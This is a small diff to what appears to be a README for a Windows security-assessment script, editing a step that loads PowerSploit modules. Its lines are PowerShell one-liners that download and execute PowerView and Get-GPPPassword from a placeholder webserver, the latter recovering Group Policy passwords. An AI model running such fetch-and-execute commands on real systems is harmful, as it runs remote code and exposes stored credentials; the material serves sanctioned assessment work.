@@ -28,8 +28,7 @@ Run the following commands ``` chaps-powershell.ps1```  to import and execute Po
 vbnet
 ```Copy code
 IEX (New-Object Net.WebClient).DownloadString('http://<webserver>:8181/PowerSploit/Recon/PowerView.ps1')
-IEX (New-Object Net.WebClient).DownloadString('http://<webserver>:8181/PowerSploit/Exfiltration/Get-GPPPassword.ps1')
-... ```
+IEX (New-Object Net.WebClient).DownloadString('http://<webserver>:8181/PowerSploit/Exfiltration/Get-GPPPassword.ps1') ```
 
 
 Step 4: Reviewing Output
